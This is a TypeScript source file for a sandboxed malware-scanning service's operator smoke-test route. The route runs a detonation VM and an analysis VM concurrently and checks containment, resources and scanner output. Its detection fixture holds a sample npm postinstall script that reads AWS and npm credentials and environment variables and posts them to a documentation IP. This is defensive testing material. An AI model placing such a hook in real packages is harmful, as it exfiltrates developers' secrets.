/**
 * Operator smoke detonation (POST /api/ops/smoke), Preview only.
 *
 * Boots two fresh VMs from the built template at the same moment, exactly as a
 * scan does: the detonation VM (outer fence: registries only) runs the template's
 * own smoke detonation `/opt/cr/bin/cr-smoke.sh`, which detonates our local test
 * package through the real cr-detonate.sh and prints the containment proof
 * (cr-proof.sh: forge as uid 0, `meta skuid 1001` rules, drop counters, forged
 * replies); the analysis VM (no egress) runs Semgrep, GuardDog and YARA through
 * the production `runAnalysis` over a small fixture of our own. Both VMs are
 * killed in `finally` (per-scan reset). The response carries every output, the
 * timings that show the two ran concurrently, and the resource facts read from
 * inside the detonation VM.
 *
 * Guard: anything but VERCEL_ENV=preview with a valid x-cr-operator-key
 * (constant-time compare) answers 404, so the route does not exist on
 * production or to anyone without the key.
 */

import { isOperatorKey, loadEngineConfig, type EngineConfig } from "../engine/config";
import { runAnalysis, type AnalysisResult } from "../engine/sandbox/analyze";
import { E2BProvider } from "../engine/sandbox/e2b";
import { withSandbox, type SandboxProvider } from "../engine/sandbox/provider";
import { SANDBOX_CPU_COUNT, SANDBOX_MEMORY_MB } from "../engine/sandbox/resources";
import { probeLuna, probeNetwork, runPipelineTiming, type PipelineEngine } from "./ops-pipeline";
import { GUARDDOG_VERSION_CMD, SEMGREP_VERSION_CMD, YARA_VERSION_CMD } from "../engine/sandbox/scanner-versions";

export const SMOKE_SCRIPT = "/opt/cr/bin/cr-smoke.sh";
/** Sandbox lifetime cap; E2B reaps the VM even if this function dies. */
export const SMOKE_SANDBOX_TIMEOUT_MS = 240_000;
export const SMOKE_COMMAND_TIMEOUT_MS = 200_000;
const FACTS_TIMEOUT_MS = 30_000;
const MAX_OUTPUT = 60_000;

type Env = Record<string, string | undefined>;

export interface OpsSmokeDeps {
  /** Builds the provider for a config (tests pass a scripted one). */
  provider?: (config: EngineConfig) => SandboxProvider;
  now?: () => number;
  randomId?: () => string;
  fetch?: typeof fetch;
  /** Jev, Luna and fetch for the pipeline part (tests); production uses productionDeps. */
  engine?: (config: EngineConfig) => PipelineEngine;
}

export interface PublicPortProbe {
  url: string;
  status: number | null;
  body: string;
  closed: boolean;
}

/**
 * Request the detonation VM's forge port through E2B's public sandbox URL from
 * outside the VM. With allowPublicTraffic false the E2B proxy refuses it before
 * anything in the VM sees it. Only a 4xx or 5xx from the proxy counts as closed;
 * a 2xx or 3xx (open to the world) or no response at all (nothing proven) fails.
 */
async function probePublicPort(s: unknown, fetchImpl: typeof fetch): Promise<PublicPortProbe | null> {
  const withUrl = s as { publicUrl?: (port: number) => string };
  if (typeof withUrl.publicUrl !== "function") return null;
  const url = `${withUrl.publicUrl(8080)}/cr-ops-public-probe`;
  try {
    const r = await fetchImpl(url, { signal: AbortSignal.timeout(8_000), redirect: "manual" });
    const body = (await r.text()).slice(0, 300);
    return { url, status: r.status, body, closed: r.status >= 400 };
  } catch (err) {
    return { url, status: null, body: err instanceof Error ? err.message : String(err), closed: false };
  }
}

export interface TimedSpan {
  start_ms: number;
  end_ms: number;
}

export interface Assertion {
  name: string;
  ok: boolean;
  detail: string;
}

/** Our own detection fixture for the analysis VM. It is scanned, never run. */
export function analysisFixture(): Map<string, Uint8Array> {
  const enc = new TextEncoder();
  const files = new Map<string, Uint8Array>();
  files.set(
    "package.json",
    enc.encode(JSON.stringify({ name: "cr-ops-smoke-fixture", version: "1.0.0", scripts: { postinstall: "node install.js" } }, null, 2) + "\n"),
  );
  files.set(
    "install.js",
    enc.encode(
      [
        'const fs = require("fs");',
        'const https = require("https");',
        'const aws = fs.readFileSync("~/.aws/credentials", "utf8");',
        'const npmrc = fs.readFileSync("~/.npmrc", "utf8");',
        "const env = JSON.stringify(process.env);",
        'const req = https.request({ host: "203.0.113.9", method: "POST", path: "/c" });',
        "req.end(aws + npmrc + env);",
        "",
      ].join("\n"),
    ),
  );
  return files;
}

function clip(s: string): string {
  return s.length > MAX_OUTPUT ? `${s.slice(0, MAX_OUTPUT / 2)}\n...[cut]...\n${s.slice(-MAX_OUTPUT / 2)}` : s;
}

/** Parse `nproc` and `MemTotal` lines printed by the facts command. */
export function parseResources(stdout: string): { nproc: number | null; mem_total_kb: number | null } {
  const n = /^nproc=(\d+)$/m.exec(stdout);
  const m = /^MemTotal:\s+(\d+) kB$/m.exec(stdout);
  return { nproc: n ? Number(n[1]) : null, mem_total_kb: m ? Number(m[1]) : null };
}

/** The guest commands run as root in the detonation VM before the smoke. */
export const FACTS_CMD = [
  'echo "nproc=$(nproc)"',
  "grep -E '^MemTotal:' /proc/meminfo",
  'echo "kernel=$(uname -r)"',
  `echo "semgrep=$(${SEMGREP_VERSION_CMD})"`,
  `echo "guarddog=$(${GUARDDOG_VERSION_CMD})"`,
  `echo "yara_x=$(${YARA_VERSION_CMD})"`,
  "jq -c '{node, npm, mitmproxy, semgrep, guarddog, yara_x}' /opt/cr/manifest.json",
].join(" && ");

/** MemTotal for a 2048 MB VM, after the kernel's own reservation. */
export function memoryMatches(kb: number | null, memoryMb = SANDBOX_MEMORY_MB): boolean {
  if (kb === null) return false;
  const want = memoryMb * 1024;
  return kb <= want && kb >= want * 0.85;
}

function notFound(): Response {
  return new Response("Not Found", { status: 404, headers: { "Content-Type": "text/plain", "Cache-Control": "no-store" } });
}

function json(body: unknown, status: number): Response {
  return new Response(JSON.stringify(body, null, 2), { status, headers: { "Content-Type": "application/json", "Cache-Control": "no-store" } });
}

/** True only on a Vercel Preview deployment with the operator key presented. */
export function smokeAllowed(env: Env, presented: string | null): { config: EngineConfig } | null {
  if (env.VERCEL_ENV !== "preview") return null;
  const config = loadEngineConfig(env);
  if (!isOperatorKey(config, presented)) return null;
  return { config };
}

export async function handleOpsSmoke(req: Request, env: Env, deps: OpsSmokeDeps = {}): Promise<Response> {
  let allowed: { config: EngineConfig } | null;
  try {
    allowed = smokeAllowed(env, req.headers.get("x-cr-operator-key"));
  } catch {
    return notFound();
  }
  if (!allowed) return notFound();
  const { config } = allowed;
  if (!deps.provider && !config.e2bApiKey) return json({ ok: false, error: "E2B_API_KEY is not set on this deployment" }, 503);

  const now = deps.now ?? (() => Date.now());
  const fetchImpl = deps.fetch ?? fetch;
  const runId = `ops-smoke-${(deps.randomId ?? (() => crypto.randomUUID()))()}`;
  const provider = deps.provider ? deps.provider(config) : new E2BProvider({ apiKey: config.e2bApiKey!, template: config.e2bTemplate });
  const url = new URL(req.url);
  const parts = new Set((url.searchParams.get("parts") ?? "proof,pipeline,luna,net").split(",").map((p) => p.trim()));
  const started = now();
  const out: Record<string, unknown> = { run_id: runId, template: provider.template, size: { vcpu: SANDBOX_CPU_COUNT, memory_mb: SANDBOX_MEMORY_MB }, parts: [...parts] };
  let ok = true;
  if (parts.has("proof")) {
    const proof = await runProof(provider, config, runId, now, fetchImpl);
    ok &&= proof.ok;
    Object.assign(out, proof.body);
  }
  if (parts.has("pipeline")) {
    const pipeline = await runPipelineTiming(config, provider, now, deps.engine?.(config));
    const forgedWithCanary = pipeline.forged_calls.filter((c) => c.canary_hits.length > 0);
    const kills = pipeline.checks.filter((c) => c.name === "sandbox_killed");
    const pipelineAssertions: Assertion[] = [
      { name: "pipeline_fresh", ok: pipeline.ok, detail: pipeline.error ?? `${pipeline.verdict} ${pipeline.score}, writer ${pipeline.writer}` },
      { name: "pipeline_canary_caught", ok: forgedWithCanary.some((c) => c.host === "c2.cr-fixture.invalid"), detail: JSON.stringify(forgedWithCanary).slice(0, 300) },
      { name: "pipeline_decoy_read", ok: pipeline.decoy_reads.includes("/home/cr/.aws/credentials"), detail: pipeline.decoy_reads.join(", ") },
      { name: "pipeline_verdict", ok: pipeline.verdict === "Malicious" || pipeline.verdict === "High risk", detail: String(pipeline.verdict) },
      { name: "pipeline_not_verified", ok: pipeline.not_verified.length > 0, detail: `${pipeline.not_verified.length} line(s)` },
      { name: "pipeline_both_vms_killed", ok: kills.length === 2 && kills.every((k) => k.ok), detail: kills.map((k) => k.detail).join(" | ") },
      { name: "pipeline_contained", ok: pipeline.checks.some((c) => c.name === "egress_contained" && c.ok), detail: "egress_contained check from the harness" },
    ];
    ok &&= pipelineAssertions.every((a) => a.ok);
    const { report, ...rest } = pipeline;
    out.pipeline = { ...rest, assertions: pipelineAssertions, headline: report?.headline ?? null, summary: report?.summary ?? null };
    if (parts.has("luna") && report && config.openaiApiKey) {
      out.luna = await probeLuna(config, report, ["low", "none"], now);
    }
  }
  if (parts.has("net")) out.net = await probeNetwork(config, now);
  out.ok = ok;
  out.total_ms = Math.round(now() - started);
  return json(out, ok ? 200 : 500);
}

/** The containment proof: template smoke detonation (cr-smoke.sh) and the production analysis on our fixture, concurrently. */
async function runProof(provider: SandboxProvider, config: EngineConfig, runId: string, now: () => number, fetchImpl: typeof fetch): Promise<{ ok: boolean; body: Record<string, unknown> }> {
  const t0 = now();
  const rel = () => Math.round(now() - t0);
  const killed: Assertion[] = [];
  const onKilled = (ok: boolean, detail: string) => killed.push({ name: "sandbox_killed", ok, detail });

  const detonation = (async () => {
    const span: TimedSpan & { boot_ms: number; smoke_ms: number } = { start_ms: rel(), end_ms: 0, boot_ms: 0, smoke_ms: 0 };
    try {
      const out = await withSandbox(
        provider,
        { purpose: "detonate", runId, timeoutMs: SMOKE_SANDBOX_TIMEOUT_MS, network: "registry-only" },
        async (s) => {
          span.boot_ms = rel() - span.start_ms;
          const facts = await s.run(FACTS_CMD, { timeoutMs: FACTS_TIMEOUT_MS });
          const publicPort = await probePublicPort(s, fetchImpl);
          const s0 = rel();
          const smoke = await s.run(`bash ${SMOKE_SCRIPT}`, { timeoutMs: SMOKE_COMMAND_TIMEOUT_MS });
          span.smoke_ms = rel() - s0;
          return { sandbox_id: s.id, facts, smoke, public_port: publicPort };
        },
        onKilled,
      );
      span.end_ms = rel();
      return { span, ...out, error: null as string | null };
    } catch (err) {
      span.end_ms = rel();
      return { span, sandbox_id: null, facts: null, smoke: null, public_port: null, error: err instanceof Error ? err.message : String(err) };
    }
  })();

  const analysis = (async () => {
    const span: TimedSpan = { start_ms: rel(), end_ms: 0 };
    try {
      const r: AnalysisResult = await runAnalysis(
        provider,
        { runId, files: analysisFixture(), ecosystems: ["npm"], sandboxTimeoutMs: config.deadlines.sandboxTimeoutMs, commandTimeoutMs: config.deadlines.analysisMs },
        { onKilled },
      );
      span.end_ms = rel();
      return { span, result: r, error: null as string | null };
    } catch (err) {
      span.end_ms = rel();
      return { span, result: null, error: err instanceof Error ? err.message : String(err) };
    }
  })();

  const [det, ana] = await Promise.all([detonation, analysis]);

  const resources = parseResources(det.facts?.stdout ?? "");
  const smokeOut = det.smoke?.stdout ?? "";
  const overlap = Math.min(det.span.end_ms, ana.span.end_ms) - Math.max(det.span.start_ms, ana.span.start_ms);
  const assertions: Assertion[] = [
    { name: "vcpu", ok: resources.nproc === SANDBOX_CPU_COUNT, detail: `nproc=${resources.nproc} want ${SANDBOX_CPU_COUNT}` },
    { name: "memory", ok: memoryMatches(resources.mem_total_kb), detail: `MemTotal=${resources.mem_total_kb} kB for ${SANDBOX_MEMORY_MB} MB` },
    { name: "smoke_exit", ok: det.smoke?.exitCode === 0, detail: det.error ?? `cr-smoke.sh exit ${det.smoke?.exitCode}` },
    { name: "smoke_pass", ok: /^cr-smoke: PASS /m.test(smokeOut), detail: "cr-smoke.sh printed PASS" },
    { name: "containment_proof", ok: /^cr-proof: PASS$/m.test(smokeOut), detail: "cr-proof.sh printed PASS" },
    { name: "analysis_complete", ok: ana.result?.complete === true, detail: ana.error ?? `tools ${JSON.stringify(ana.result?.tools ?? {})}` },
    ...(det.public_port
      ? [{ name: "public_port_closed", ok: det.public_port.closed, detail: `${det.public_port.url} -> ${det.public_port.status ?? "no response"} ${det.public_port.body.slice(0, 120)}` }]
      : []),
    { name: "concurrent", ok: overlap > 0, detail: `detonation and analysis overlapped ${overlap} ms` },
    ...killed,
  ];
  const ok = assertions.every((a) => a.ok) && killed.length === 2;

  return {
    ok,
    body: {
      assertions,
      resources,
      timings: { total_ms: rel(), detonation: det.span, analysis: ana.span, overlap_ms: overlap },
      detonation: {
        sandbox_id: det.sandbox_id,
        error: det.error,
        public_port: det.public_port,
        facts: det.facts ? { exit: det.facts.exitCode, stdout: clip(det.facts.stdout), stderr: clip(det.facts.stderr) } : null,
        smoke: det.smoke ? { exit: det.smoke.exitCode, stdout: clip(det.smoke.stdout), stderr: clip(det.smoke.stderr) } : null,
      },
      analysis: ana.result
        ? {
            sandbox_id: ana.result.sandboxId,
            complete: ana.result.complete,
            tools: ana.result.tools,
            errors: ana.result.errors,
            findings: ana.result.findings.map((f) => ({ source: f.source, rule: f.rule, severity: f.severity, file: f.file, line: f.line })),
          }
        : { error: ana.error },
    },
  };
}
